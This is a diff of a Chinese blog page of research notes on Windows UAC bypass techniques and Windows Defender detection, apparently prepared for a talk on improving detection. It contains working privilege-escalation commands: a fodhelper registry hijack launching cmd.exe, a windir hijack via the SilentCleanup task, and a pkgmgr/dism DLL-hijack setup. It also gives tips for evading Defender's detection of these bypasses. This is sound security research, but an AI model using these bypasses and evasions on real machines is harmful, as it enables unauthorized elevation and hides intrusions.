@@ -74,10 +74,10 @@
         
           <a class="nav-icon" href="/rss.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
         
-        <a class="nav-icon nav-search-btn" title="Suche"><span class="fa fa-search"></span></a>
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
       </nav>
       <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Suche"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://wjk.moe"></form>
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://wjk.moe"></form>
       </div>
     </div>
   </div>
@@ -124,61 +124,88 @@
 </ol>
 <p>能讲的：</p>
 <ol type="1">
-<li><p>比Windows Defender能做得更好的地方。因为讲Win Defender的也就那一篇文章，研究防御的人还是少的，而我们就是研究了Windows defender的检测的人。搞搞花式绕过。目前有注册表跟随符号链接和.local的DLL劫持方面能检测绕过WD的攻击。</p></li>
-<li><p>FIleless attack 只留在注册表的那个攻击。 这就可能会避开windows defender的扫描</p>
+<li><p>比Windows Defender能做得更好的地方。因为讲Win
+Defender的也就那一篇文章，研究防御的人还是少的，而我们就是研究了Windows
+defender的检测的人。搞搞花式绕过。目前有注册表跟随符号链接和.local的DLL劫持方面能检测绕过WD的攻击。</p></li>
+<li><p>FIleless attack 只留在注册表的那个攻击。 这就可能会避开windows
+defender的扫描</p>
 <p>https://github.com/bytecode77/living-off-the-land</p>
 <p>https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/</p>
-<p>https://www.cybereason.com/blog/fileless-malware 现在的不少最新恶意软件在用</p></li>
+<p>https://www.cybereason.com/blog/fileless-malware
+现在的不少最新恶意软件在用</p></li>
 <li><p>Living off the land 相关攻击</p></li>
 <li><p>搞一些新的攻击检测，Process reimage attack？</p></li>
-<li><p>锁屏界面下的键盘启动cmd的后门的检测 <a target="_blank" rel="noopener" href="https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Attacking-Windows-At-The-Logon-Screen,---Gaining-Access-To-CMD-With-System-Privileges.">here</a></p></li>
+<li><p>锁屏界面下的键盘启动cmd的后门的检测 <a
+target="_blank" rel="noopener" href="https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Attacking-Windows-At-The-Logon-Screen,---Gaining-Access-To-CMD-With-System-Privileges.">here</a></p></li>
 </ol>
 <p>有些部分windows用这种方法修复了，但类似的部分却没修复。</p>
 <h3 id="值得讲的大块内容">值得讲的大块内容：</h3>
 <p>注册表劫持的提权攻击-一系列。</p>
 <p>COM组件提权 新博客内容。 COM组件提权的历史与修复</p>
-<p>winsxs和.local机制 https://www.kernelmode.info/forum/viewtopicb857.html?t=3643&amp;start=90#p28579 ，高权限移动文件的基础方法，sysprep.exe系列的dll劫持，UAC攻击的起源</p>
+<p>winsxs和.local机制
+https://www.kernelmode.info/forum/viewtopicb857.html?t=3643&amp;start=90#p28579
+，高权限移动文件的基础方法，sysprep.exe系列的dll劫持，UAC攻击的起源</p>
 <p>wow64log机制, .net的profiling dll</p>
 <p>UIAccess的消息注入</p>
 <p>Manifest的路径漏洞</p>
 <h3 id="资源">资源</h3>
-<p>https://www.kernelmode.info/forum/viewtopice732.html?f=11&amp;t=3643 能补充UACMe</p>
+<p>https://www.kernelmode.info/forum/viewtopice732.html?f=11&amp;t=3643
+能补充UACMe</p>
 <h3 id="uac-绕过的历史">UAC 绕过的历史</h3>
-<p>2014年12月：有63种UAC绕过的方法。20%的方法是其他方法的结合。<strong>Win32</strong>/<strong>Simda</strong>. B 这个之前广泛传播的木马，它利用的<strong>ISecurityEditor</strong> 这个方法让微软限制它只能用于文件后，不仅原来的方法失效了，<em>Application Verifier</em> dll planting（later this method was also used in some ITW malware）相关的方法也受到了影响。</p>
+<p>2014年12月：有63种UAC绕过的方法。20%的方法是其他方法的结合。<strong>Win32</strong>/<strong>Simda</strong>.
+B 这个之前广泛传播的木马，它利用的<strong>ISecurityEditor</strong>
+这个方法让微软限制它只能用于文件后，不仅原来的方法失效了，<em>Application
+Verifier</em> dll planting（later this method was also used in some ITW
+malware）相关的方法也受到了影响。</p>
 <p>微软只在有很大负面新闻的时候和大版本更新的时候才搞搞UAC。</p>
-<p><em>Sysprep.exe</em>、<em>inetmgr.exe</em> 通过Manifest 的<strong><em>loadFrom</em></strong> 加固，unfortunately this was incomplete fix and it took them few more years to finally harden sysprep from dll hijacking。这里面的故事可以讲讲 TODO</p>
+<p><em>Sysprep.exe</em>、<em>inetmgr.exe</em> 通过Manifest
+的<strong><em>loadFrom</em></strong> 加固，unfortunately this was
+incomplete fix and it took them few more years to finally harden sysprep
+from dll hijacking。这里面的故事可以讲讲 TODO</p>
 <p>*<strong>Software</strong> 被动了，WD就会报警</p>
 <p><em>sdclt.exe</em> *<strong>/kickoffelev*</strong> 的报警</p>
 <h3 id="uac-原理">UAC 原理</h3>
-<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/previous-versions/technet-magazine/dd822916(v=msdn.10)">微软找借口文章1-</a></p>
-<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/previous-versions/bb757008(v=msdn.10)">How UAC Works</a></p>
-<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/previous-versions/bb756945(v=msdn.10)">UAC Architecture</a></p>
+<p><a
+target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/previous-versions/technet-magazine/dd822916(v=msdn.10)">微软找借口文章1-</a></p>
+<p><a
+target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/previous-versions/bb757008(v=msdn.10)">How
+UAC Works</a></p>
+<p><a
+target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/previous-versions/bb756945(v=msdn.10)">UAC
+Architecture</a></p>
 <p>在启动新进程的时候，通过一系列的流程决定是给程序受限令牌还是完整令牌。</p>
 <p>通过安全桌面询问用户。</p>
 <p>UAC slide UAC提醒级别控制条。AlwaysNotify</p>
 <p>默认的级别运行可以看到，允许部分系统设置更改的时候提醒。</p>
 <h3 id="uac自动提升总结">UAC自动提升总结</h3>
 <p>Security through obscurity？</p>
-<p>RPC call is made to AIS 。appinfo.dll逆向得到<a target="_blank" rel="noopener" href="https://medium.com/tenable-techblog/uac-bypass-by-mocking-trusted-directories-24a96675f6e">自动提取的规则</a></p>
+<p>RPC call is made to AIS 。appinfo.dll逆向得到<a
+target="_blank" rel="noopener" href="https://medium.com/tenable-techblog/uac-bypass-by-mocking-trusted-directories-24a96675f6e">自动提取的规则</a></p>
 <p>阶段1：Manifest内的AutoElevate/<strong>g_lpAutoApproveEXEList</strong></p>
 <p>阶段2 微软签名</p>
 <p>阶段3 受信任的目录下 C: 、Program Files等</p>
-<p>不能把微软的不提权程序通过修改Manifest成为提权程序，因为 如果自己去更改Manifest，会破坏签名</p>
-<p>Manifest中的自动提升 https://technet.microsoft.com/en-us/magazine/2009.07.uac.aspx</p>
+<p>不能把微软的不提权程序通过修改Manifest成为提权程序，因为
+如果自己去更改Manifest，会破坏签名</p>
+<p>Manifest中的自动提升
+https://technet.microsoft.com/en-us/magazine/2009.07.uac.aspx</p>
 <ol type="1">
 <li>被（微软）签名</li>
 <li>位于如 C: 的安全目录<strong>g_lpIncludePFDirs</strong> 中</li>
 </ol>
 <p><strong>g_lpAutoApproveEXEList</strong> 内部的approve表，直接提权</p>
 <p><strong>g_lpIncludePFDirs</strong> 内部的可信文件夹列表</p>
-<p>COM Approval List <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/com/the-com-elevation-moniker">elevated com moniker</a> https://swapcontext.blogspot.com/</p>
+<p>COM Approval List <a
+target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/com/the-com-elevation-moniker">elevated
+com moniker</a> https://swapcontext.blogspot.com/</p>
 <ol type="1">
 <li><p>需要首先在HKEY_CLASSES_ROOT {CLSID} = 1 这里启用</p></li>
 <li><p>（RS1）HKEY_LOCAL_MACHINENT里面也有。这次更新打掉了不少的Bypass的</p></li>
 </ol>
-<h2 id="基本操作--explorer-ifileoperation">基本操作- Explorer + IFileOperation</h2>
+<h2 id="基本操作--explorer-ifileoperation">基本操作- Explorer +
+IFileOperation</h2>
 <p>注入到Explorer.exe然后使用IFileOperation移动文件。</p>
-<p>拓展：<a target="_blank" rel="noopener" href="https://github.com/AV1080p/Mottoin-SecPaper/blob/master/UAC%E6%94%BB%E5%87%BB%E5%89%96%E6%9E%90.md#0x03-%E6%8F%90%E6%9D%83%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C">伪装成explorer.EXE</a></p>
+<p>拓展：<a
+target="_blank" rel="noopener" href="https://github.com/AV1080p/Mottoin-SecPaper/blob/master/UAC%E6%94%BB%E5%87%BB%E5%89%96%E6%9E%90.md#0x03-%E6%8F%90%E6%9D%83%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C">伪装成explorer.EXE</a></p>
 <h2 id="dll劫持">DLL劫持</h2>
 <p>https://www.freebuf.com/articles/system/83369.html</p>
 <p>程序可以通过DLL实现拓展功能。由于DLL的灵活性，程序可以动态判断是否有某个DLL，如果有则加载，并使用相关的功能，没有则不加载，从而实现插件等功能。但这也为DLL劫持留下了机会。</p>
@@ -196,7 +223,8 @@
 </ol>
 <p>缺点：文件剪切粘贴会被绕过、无法检测文件夹创建</p>
 <p>winsxs的dot-local为DLL劫持提供了更多的机会</p>
-<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order">DLL搜索路径</a></p>
+<p><a
+target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order">DLL搜索路径</a></p>
 <p>一些可劫持的exe和dll组合的统计：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">C:\windows\System32\sysprep\sysprep.exe</span><br><span class="line">C:\Windows\System32\Sysprep\SHCORE.dll</span><br><span class="line">C:\Windows\System32\Sysprep\OLEACC.DLL</span><br><span class="line"></span><br><span class="line">C:\windows\System32\cliconfg.exe</span><br><span class="line">C:\Windows\System32\NTWDBLIB.DLL</span><br><span class="line"></span><br><span class="line">C:\windows\System32\pwcreator.exe</span><br><span class="line">C:\Windows\System32\vds.exe</span><br><span class="line">C:\Program Files\Common Files\microsoft shared\ink\CRYPTBASE.dll</span><br><span class="line">C:\Program Files\Common Files\microsoft shared\ink\CRYPTSP.dll</span><br><span class="line">C:\Program Files\Common Files\microsoft shared\ink\dwmapi.dll</span><br><span class="line">C:\Program Files\Common Files\microsoft shared\ink\USERENV.dll</span><br><span class="line">C:\Program Files\Common Files\microsoft shared\ink\OLEACC.dll</span><br><span class="line"></span><br><span class="line">C:\windows\System32\cliconfg.exe</span><br><span class="line">C:\Windows\System32\NTWDBLIB.DLL</span><br><span class="line"></span><br><span class="line">C:\windows\System32\pwcreator.exe</span><br><span class="line">C:\Windows\System32\vds.exe</span><br><span class="line">C:\Windows\System32\UReFS.DLL</span><br><span class="line"></span><br><span class="line">C:\windows\ehome\Mcx2Prov.exe</span><br><span class="line">C:\Windows\ehome\CRYPTBASE.dll</span><br><span class="line"></span><br><span class="line">C:\windows\System32\sysprep\sysprep.exe</span><br><span class="line">C:\Windows\System32\sysprep\CRYPTSP.dll</span><br><span class="line">C:\windows\System32\sysprep\CRYPTBASE.dll</span><br><span class="line">C:\Windows\System32\sysprep\RpcRtRemote.dll</span><br><span class="line">C:\Windows\System32\sysprep\UxTheme.dll</span><br><span class="line"></span><br><span class="line">C:\windows\System32\cliconfg.exe</span><br><span class="line">C:\Windows\System32\NTWDBLIB.DLL</span><br></pre></td></tr></table></figure>
 <p>首先第一层防线是防止高权限移动文件。</p>
@@ -211,45 +239,46 @@
 <p>当前目录下的exe名字+.local文件夹会优先成为dll搜索路径</p>
 <p>dccw.exe屏幕校准和consent.exe，GoogleUpdate.exe没有menifest会找.local</p>
 <h3 id="setprocessmitigationpolicy">SetProcessMitigationPolicy</h3>
-<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setprocessmitigationpolicy">API文档</a></p>
+<p><a
+target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setprocessmitigationpolicy">API文档</a></p>
 <p>ProcessSignaturePolicy 防止加载非微软签名的dll。相关的论文不少。</p>
 <p>怎样让系统exe能启动的时候调用？内核态驱动层设置？</p>
 <h3 id="已经收集的攻击方法分类">已经收集的攻击方法分类</h3>
 <table>
 <thead>
-<tr class="header">
+<tr>
 <th>类型</th>
 <th>未修复的攻击</th>
 <th>已修复</th>
 </tr>
 </thead>
 <tbody>
-<tr class="odd">
+<tr>
 <td>注册表劫持</td>
 <td>#33 #62 #53 #56 #61</td>
 <td>#29 #25 #31</td>
 </tr>
-<tr class="even">
+<tr>
 <td>DLL劫持</td>
 <td>#22 #23 #30 #37 #39</td>
 <td>#18 #26</td>
 </tr>
-<tr class="odd">
+<tr>
 <td>COM组件</td>
 <td>#38 #59 #41 #43</td>
 <td></td>
 </tr>
-<tr class="even">
+<tr>
 <td>UIAccess</td>
 <td>#32 #55</td>
 <td></td>
 </tr>
-<tr class="odd">
+<tr>
 <td>其他</td>
 <td>#36 #35 #52 #63</td>
 <td></td>
 </tr>
-<tr class="even">
+<tr>
 <td>环境变量</td>
 <td>#34 #58</td>
 <td></td>
@@ -259,27 +288,36 @@
 <p>其中也有UAC提醒等级为Always Notify下可以绕过的方法: #26 #34</p>
 <h3 id="windows-中的动词机制">Windows 中的动词机制</h3>
 <p>https://docs.microsoft.com/en-us/windows/win32/shell/fa-verbs</p>
-<p><strong>eg : Print</strong>, <strong>Edit</strong> and <strong>Open with</strong>. 这个动词对应的恰好是ShellExecute的lpOperation参数。系统拿着动词去注册表找。</p>
-<p>HKEY_CLASSES_ROOT 是*HKEY_LOCAL_MACHINE的链接。内保存了各种不同类型的文件拓展对应的打开方式。如HKCR\.py\@ 保存的是Python.File。而HKCR\Python.File就保存了打开python文件的命令行。</p>
+<p><strong>eg : Print</strong>, <strong>Edit</strong> and <strong>Open
+with</strong>.
+这个动词对应的恰好是ShellExecute的lpOperation参数。系统拿着动词去注册表找。</p>
+<p>HKEY_CLASSES_ROOT
+是*HKEY_LOCAL_MACHINE的链接。内保存了各种不同类型的文件拓展对应的打开方式。如HKCR\.py\@
+保存的是Python.File。而HKCR\Python.File就保存了打开python文件的命令行。</p>
 <p>但是HKEY_LOCAL_MACHINE是系统的总体打开方式。每个用户也有自己的HKEY_Current_User。</p>
 <p>用户自己设置的打开方式理论上是覆盖系统的打开方式，就像局部变量的名字覆盖全局变量一样。</p>
 <p>一般HKCU里面查不到是正常的，在HKLM里有，但是会去HKCU里面找。</p>
-<h2 id="eventvwr.exe的注册表劫持---失效">#25 EventVwr.exe的注册表劫持 - 失效</h2>
+<h2 id="eventvwr.exe的注册表劫持---失效">#25 EventVwr.exe的注册表劫持 -
+失效</h2>
 <p>发现者：enigma0x3，时间：20160815。https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/</p>
 <p>sdclt.exe /KickOffElev</p>
 <p>**HKCR*</p>
-<p>EventVwr.exe redesigned, CompMgmtLauncher.exe autoelevation removed</p>
+<p>EventVwr.exe redesigned, CompMgmtLauncher.exe autoelevation
+removed</p>
 <p>https://github.com/turbo/zero2hero</p>
 <ul>
 <li>Works from: Windows 7 (7600)</li>
 <li>Fixed in: Windows 10 RS2 (15031)
 <ul>
-<li>How: EventVwr.exe redesigned, CompMgmtLauncher.exe autoelevation removed</li>
+<li>How: EventVwr.exe redesigned, CompMgmtLauncher.exe autoelevation
+removed</li>
 </ul></li>
 </ul>
-<h2 id="sdclt.exe-apppathmethod---fixed">#29 sdclt.exe AppPathMethod - fixed</h2>
+<h2 id="sdclt.exe-apppathmethod---fixed">#29 sdclt.exe AppPathMethod -
+fixed</h2>
 <p>发现者：enigma0x3，时间：20170314。链接：https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/</p>
-<p>sdclt.exe（打开跳到控制面板的backup）通过查看低权限的注册表<strong>HKCU:Paths.exe</strong> 启动控制面板。</p>
+<p>sdclt.exe（打开跳到控制面板的backup）通过查看低权限的注册表<strong>HKCU:Paths.exe</strong>
+启动控制面板。</p>
 <ul>
 <li>Works from: Windows 10 TH1 (10240)</li>
 <li>Fixed in: Windows 10 RS3 (16215)
@@ -287,7 +325,8 @@
 <li>How: Shell API update</li>
 </ul></li>
 </ul>
-<h2 id="sdclt.exe-isolatedcommandmethod---fixed">#31 sdclt.exe IsolatedCommandMethod - fixed</h2>
+<h2 id="sdclt.exe-isolatedcommandmethod---fixed">#31 sdclt.exe
+IsolatedCommandMethod - fixed</h2>
 <p>发现者：enigma0x3，时间：20170317。https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/</p>
 <p>sdclt.exe /KickOffElev</p>
 <ul>
@@ -298,7 +337,9 @@
 </ul></li>
 </ul>
 <h2 id="注册表劫持">#33（#62） 注册表劫持</h2>
-<p>有点像infamous Enigma0x3 "<strong><em>mscfile fileless</em></strong>" bypass，但利用的是不同的注册表和不同的程序。widely used ITW by malware。</p>
+<p>有点像infamous Enigma0x3 "<strong><em>mscfile fileless</em></strong>"
+bypass，但利用的是不同的注册表和不同的程序。widely used ITW by
+malware。</p>
 <p>https://cqureacademy.com/cqure-labs/cqlabs-how-uac-bypass-methods-really-work-by-adrian-denkiewicz</p>
 <p>fodhelper.exe computerdefaults.exe 加载注册表中的 exe</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">New-Item &quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot; -Force</span><br><span class="line">New-ItemProperty -Path &quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot; -Name &quot;DelegateExecute&quot; -Value &quot;&quot; -Force</span><br><span class="line">Set-ItemProperty -Path &quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot; -Name &quot;(default)&quot; -Value cmd.exe -Force</span><br><span class="line">Start-Process &quot;C:\Windows\System32\fodhelper.exe&quot;</span><br><span class="line">Remove-Item &quot;HKCU:\Software\Classes\ms-settings\&quot; -Recurse -Force</span><br></pre></td></tr></table></figure>
@@ -309,27 +350,50 @@
 <li>符号链接写入</li>
 </ul>
 <h2 id="注册表劫持-1">#53 注册表劫持</h2>
-<p>Target key here is <strong><em>HKCU</em></strong>\<strong><em>Software\</em></strong> <span class="citation" data-cites="*Default">@*Default</span>* value (+<em>DeletegateExecute</em> as usual) and trigger is <em>sdclt.exe</em>。</p>
+<p>Target key here is
+<strong><em>HKCU</em></strong>\<strong><em>Software\</em></strong> <span
+class="citation" data-cites="*Default">@*Default</span>* value
+(+<em>DeletegateExecute</em> as usual) and trigger is
+<em>sdclt.exe</em>。</p>
 <p>WD会检测。修改那个@default就会触发。</p>
 <p>绕过方法同上。</p>
 <h2 id="注册表劫持-2">#56 注册表劫持</h2>
-<p>Target key here is <em><strong>HKCU82a6gwre4fdg3bt635tn5ctqjf8msdd2</strong> <span class="citation" data-cites="*Default">@*Default</span></em> value (+<em>DeletegateExecute</em> as usual) and trigger is <em>wsreset.exe</em></p>
+<p>Target key here is
+<em><strong>HKCU82a6gwre4fdg3bt635tn5ctqjf8msdd2</strong> <span
+class="citation" data-cites="*Default">@*Default</span></em> value
+(+<em>DeletegateExecute</em> as usual) and trigger is
+<em>wsreset.exe</em></p>
 <p>WD会检测。修改那个@default就会触发。</p>
 <p>绕过方法：准备好注册表相关的结构，再重命名过去。</p>
 <h2 id="注册表劫持-3">#61 注册表劫持</h2>
-<p>Target key here is <strong><em>HKCU*</em>Launcher.SystemSettings</strong> <span class="citation" data-cites="*Default">@*Default</span>* value (+<em>DeletegateExecute</em> as usual) and trigger is <em>slui.exe</em> which is started with <em><strong>runas*</strong> verb</em>.*</p>
+<p>Target key here is
+<strong><em>HKCU*</em>Launcher.SystemSettings</strong> <span
+class="citation" data-cites="*Default">@*Default</span>* value
+(+<em>DeletegateExecute</em> as usual) and trigger is <em>slui.exe</em>
+which is started with <em><strong>runas*</strong> verb</em>.*</p>
 <p>WD会检测。修改那个@default就会触发。</p>
-<h2 id="com组件的环境变量劫持-alwaysnofity-ok">#58 COM组件的环境变量劫持 AlwaysNofity ok</h2>
-<p><strong>EditionUpgradeManager</strong> 这个提权的接口里的<em>AcquireModernLicenseWithPreviousId</em> 函数会通过%windir%去组合路径调用<em>Clipup.exe</em>。设置windir环境变量去劫持。</p>
-<p>Cheap and easy fix - get rid of environment variables from Win95 era and build a proper path to <em>clipup.exe</em> by using, surprise - surprise! <strong><em>GetSystemDirectory</em></strong>.</p>
-<h2 id="diskcleanup计划任务---unfixed---alwaysnofity-ok">#34 DiskCleanup计划任务 - unfixed - AlwaysNofity ok</h2>
-<p>20170515 <a target="_blank" rel="noopener" href="https://twitter.com/tiraniddo">James Forshaw</a> https://www.tiraniddo.dev/2017/05/exploiting-environment-variables-in.html</p>
+<h2 id="com组件的环境变量劫持-alwaysnofity-ok">#58 COM组件的环境变量劫持
+AlwaysNofity ok</h2>
+<p><strong>EditionUpgradeManager</strong>
+这个提权的接口里的<em>AcquireModernLicenseWithPreviousId</em>
+函数会通过%windir%去组合路径调用<em>Clipup.exe</em>。设置windir环境变量去劫持。</p>
+<p>Cheap and easy fix - get rid of environment variables from Win95 era
+and build a proper path to <em>clipup.exe</em> by using, surprise -
+surprise! <strong><em>GetSystemDirectory</em></strong>.</p>
+<h2 id="diskcleanup计划任务---unfixed---alwaysnofity-ok">#34
+DiskCleanup计划任务 - unfixed - AlwaysNofity ok</h2>
+<p>20170515 <a target="_blank" rel="noopener" href="https://twitter.com/tiraniddo">James Forshaw</a>
+https://www.tiraniddo.dev/2017/05/exploiting-environment-variables-in.html</p>
 <p>https://cqureacademy.com/cqure-labs/cqlabs-how-uac-bypass-methods-really-work-by-adrian-denkiewicz</p>
 <p>*Microsoft会启动 %windir%.exe</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">New-ItemProperty &quot;HKCU:\Environment&quot; -Name &quot;windir&quot; -Value &quot;cmd.exe /k cmd.exe&quot; -PropertyType String -Force</span><br><span class="line">schtasks.exe /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I</span><br></pre></td></tr></table></figure>
-<p>WD的检测：<em>schtaks.exe</em> 的命令行是否包含“Microsoft”，有则警报 （<strong>Behavior:Win32/SilentCleanupUACBypass</strong>）</p>
-<p>检查<strong>* 子串（</strong><em>PossibleSchedTasksUACBypass</em>** ）</p>
-<p>绕过：不用schtaks，用<strong><em>ITaskService</em></strong>, <strong><em>ITaskFolder</em></strong> and <strong><em>IRegisteredTask</em></strong> 接口自己去启动</p>
+<p>WD的检测：<em>schtaks.exe</em> 的命令行是否包含“Microsoft”，有则警报
+（<strong>Behavior:Win32/SilentCleanupUACBypass</strong>）</p>
+<p>检查<strong>* 子串（</strong><em>PossibleSchedTasksUACBypass</em>**
+）</p>
+<p>绕过：不用schtaks，用<strong><em>ITaskService</em></strong>,
+<strong><em>ITaskFolder</em></strong> and
+<strong><em>IRegisteredTask</em></strong> 接口自己去启动</p>
 <p>真正应该：检测windir 环境变量改变。</p>
 <p>windows中的环境变量直接反映在注册表里。</p>
 <h2 id="method-18--fixed">Method #18 -fixed</h2>
@@ -337,24 +401,33 @@
 <p>https://www.reddit.com/r/lowlevel/comments/4lktyw/sxs_backdoor_and_story_of_windows_uac_ridiculous/</p>
 <p>https://www.kernelmode.info/forum/viewtopicb857.html?t=3643&amp;start=90#p28579</p>
 <p>背景，自从SxS+sysprep.exe的劫持，已经烂大街，微软拿出了自己的后门进行修复：</p>
-<p><strong>malware</strong> friendly的微软对应用的垃圾Manifest文件的undocumented 项</p>
+<p><strong>malware</strong>
+friendly的微软对应用的垃圾Manifest文件的undocumented 项</p>
 <p><code>&lt;file loadFrom="%systemroot%\system32\NAME.dll" name="NAME.dll" /&gt;</code></p>
-<p>只要找到没有manifest的文件，通过外置manifest文件的方法，<code>ExeName.exe.manifest</code> 通过cryptbase.dll依然在sysprep文件夹内做dll劫持。</p>
+<p>只要找到没有manifest的文件，通过外置manifest文件的方法，<code>ExeName.exe.manifest</code>
+通过cryptbase.dll依然在sysprep文件夹内做dll劫持。</p>
 <p><code>&lt;file loadFrom="%systemroot%\system32\sysprep\cryptbase.DLL" name="cryptbase.DLL"      /&gt;</code></p>
 <p>当前该方法已经失效，因为外置manifest文件不再支持这个项了。</p>
 <h2 id="section">#22</h2>
-<p><em>comctrl32.dll</em> 植入到system32 （利用.local?） 劫持<em>consent.exe</em> 。</p>
+<p><em>comctrl32.dll</em> 植入到system32 （利用.local?）
+劫持<em>consent.exe</em> 。</p>
 <p>WD只检测了子文件夹创建，和文件移动到对应的文件夹内（移动？）。不移动，直接写入文件夹可以绕过？</p>
-<p>首先通过<strong><em>IFileOperation</em></strong> with <strong>ISecurityEditor</strong> 创建文件夹并降权？</p>
+<p>首先通过<strong><em>IFileOperation</em></strong> with
+<strong>ISecurityEditor</strong> 创建文件夹并降权？</p>
 <p>创建好对应名字的文件再降权再写入。</p>
 <p>创建好其他名字的文件后再降权？再重命名，写入</p>
-<p>微软应该这样修复： process mitigation policy 的 <strong>ProcessSignaturePolicy</strong> 设置为只有微软签名的</p>
-<p>ProcessSignaturePolicy restrict image loading to those images that are either signed by Microsoft, by the Windows Store, or by Microsoft, the Windows Store and the Windows Hardware Quality Labs</p>
+<p>微软应该这样修复： process mitigation policy 的
+<strong>ProcessSignaturePolicy</strong> 设置为只有微软签名的</p>
+<p>ProcessSignaturePolicy restrict image loading to those images that
+are either signed by Microsoft, by the Windows Store, or by Microsoft,
+the Windows Store and the Windows Hardware Quality Labs</p>
 <h2 id="pkgmgr-dism劫持">#23 PkgMgr-Dism劫持</h2>
 <p>https://cqureacademy.com/cqure-labs/cqlabs-how-uac-bypass-methods-really-work-by-adrian-denkiewicz</p>
 <p>+博客https://swapcontext.blogspot.com/</p>
-<p><em>PkgMgr</em> 被放弃支持了，但还在自动提权的exe列表（g_lpAutoApproveEXEList）里，是dism的启动器。</p>
-<p>dism搜索<strong><em>dismcore.dll</em></strong> 的时候会先搜索system32文件夹，再搜索当前路径，然后找到。</p>
+<p><em>PkgMgr</em>
+被放弃支持了，但还在自动提权的exe列表（g_lpAutoApproveEXEList）里，是dism的启动器。</p>
+<p>dism搜索<strong><em>dismcore.dll</em></strong>
+的时候会先搜索system32文件夹，再搜索当前路径，然后找到。</p>
 <ol type="1">
 <li><p>创建<em>oemsetup.xml</em>文件，用来调用pkgmgr程序</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;unattend xmlns=&quot;urn:schemas-microsoft-com:unattend&quot;&gt;</span><br><span class="line">&lt;servicing&gt;</span><br><span class="line">&lt;package action=&quot;install&quot;&gt;</span><br><span class="line">&lt;assemblyIdentity name=&quot;Package_1_for_KB929761&quot; version=&quot;6.0.1.1&quot; language=&quot;neutral&quot; processorArchitecture=&quot;x86&quot; publicKeyToken=&quot;31bf3856ad364e35&quot;/&gt;</span><br><span class="line">&lt;source location=&quot;%configsetroot%\Windows6.0-KB929761-x86.CAB&quot; /&gt;</span><br><span class="line">&lt;/package&gt;</span><br><span class="line">&lt;/servicing&gt;</span><br><span class="line">&lt;/unattend&gt;</span><br></pre></td></tr></table></figure></li>
@@ -362,17 +435,24 @@
 <li><p><code>"C:\WINDOWS\system32\pkgmgr.exe" /n:C:\Users\&lt;user&gt;\AppData\Local\Temp\oemsetup.xml</code></p>
 <p>随后pkgmgr调用<code>"C:\WINDOWS\system32\dism.exe" /online /norestart /apply-unattend:"C:\Users\&lt;user&gt;\AppData\Local\Temp\oemsetup.xml"</code></p></li>
 </ol>
-<p>WD叫<strong><em>Win32/Disemer</em></strong>，首先会检测system32下的 DismCore.dll（平常系统不可能发生），其次会检测<em>pkgmgr.exe</em> 的参数里特定的Token</p>
+<p>WD叫<strong><em>Win32/Disemer</em></strong>，首先会检测system32下的
+DismCore.dll（平常系统不可能发生），其次会检测<em>pkgmgr.exe</em>
+的参数里特定的Token</p>
